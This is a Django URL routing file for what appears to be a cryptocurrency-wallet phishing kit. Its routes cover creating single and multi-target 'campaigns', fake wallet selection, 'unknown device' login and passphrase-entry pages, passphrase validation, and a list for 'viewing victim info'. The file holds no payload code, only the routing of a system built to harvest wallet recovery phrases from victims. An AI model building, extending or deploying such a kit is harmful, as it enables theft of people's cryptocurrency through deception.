from django.urls import path
from . import views

app_name = 'core'

urlpatterns = [
    path('', views.wallet_info, name='index'),
    path('create-campaign/', views.create_campaign, name='create_campaign'),
    path('create-multi-campaign/', views.create_multi_campaign, name='create_multi_campaign'),  # URL for multi campaign creation
    path('campaign/<str:pk>/', views.campaign_detail, name='campaign_detail'),
    path('campaigns/', views.campaign_list, name='campaign_list'),
    path('wallet-info/<str:campaign_id>/auth/', views.unknown_device_login, name='unknown_device_login'),  # Include campaignid
    path('wallet-info/<str:campaign_id>/', views.wallet_info, name='wallet_info'),  # Include campaign_id
    path('address-info/<str:campaign_id>/', views.address_info, name='address_info'),
    #path('passphrase-info/', views.passphrase_info, name='passphrase_info'),
    path('passphrase-info/<str:campaign_id>/', views.passphrase_info, name='passphrase_info'),
    path('success/<str:pk>/', views.success, name='success'),
    path('victim-info/', views.victim_info_list, name='victim_info_list'),  # Viewing victim info
    path('auth/<str:campaign_id>/', views.wallet_select, name='wallet_select'),  # Include campaign_id
    path('auth-info/<str:campaign_id>/', views.passphrase_validate, name='passphrase_validate'),  # Include campaign_id
    path('auth/verification/success/', views.login_success, name='login_success'),
]